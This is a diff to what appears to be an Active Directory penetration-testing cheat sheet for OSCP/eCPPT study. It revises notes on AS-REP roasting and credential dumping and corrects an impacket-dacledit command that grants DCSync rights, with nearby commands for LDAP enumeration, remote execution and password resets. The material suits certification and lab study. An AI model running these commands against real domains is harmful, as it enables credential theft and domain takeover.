@@ -122,7 +122,7 @@ ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local" "(objectClass=user)" sAM
 - When to use: Phase 2 — the first attack right after you have usernames. Before any brute force.
 - eCPPT: allowed
 - OSCP: allowed
-- Principle: for accounts with pre-auth disabled, the DC hands out the hash for free.
+- Principle: with pre-auth disabled, the DC returns an AS-REP blob encrypted with the user's key; it is not a stored hash, so it must be cracked.
 - Key commands:
 
 ```bash
@@ -264,7 +264,7 @@ impacket-wmiexec '<DOMAIN>/<USER>:<PASS>'@<IP>
 xfreerdp /u:'USER' /p:'PASS' /v:<IP> /cert-ignore
 ```
 
-## Credential dumping (Phase 9)
+## Credential dumping
 
 ### impacket-secretsdump
 
@@ -323,7 +323,7 @@ net rpc password "TARGET_USER" "NewP@ss123!" -U '<DOMAIN>/<USER>%<PASS>' -S <DC_
 - Key commands:
 
 ```bash
-impacket-dacledit -action 'write' -rights 'DCSync' -principal 'USER' '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
+impacket-dacledit -action 'write' -rights 'DCSync' -principal 'USER' -target-dn 'DC=<DOMAIN>,DC=<TLD>' '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
 ```
 
 - If missing, alternative: use PowerView from a Windows shell or evil-winrm
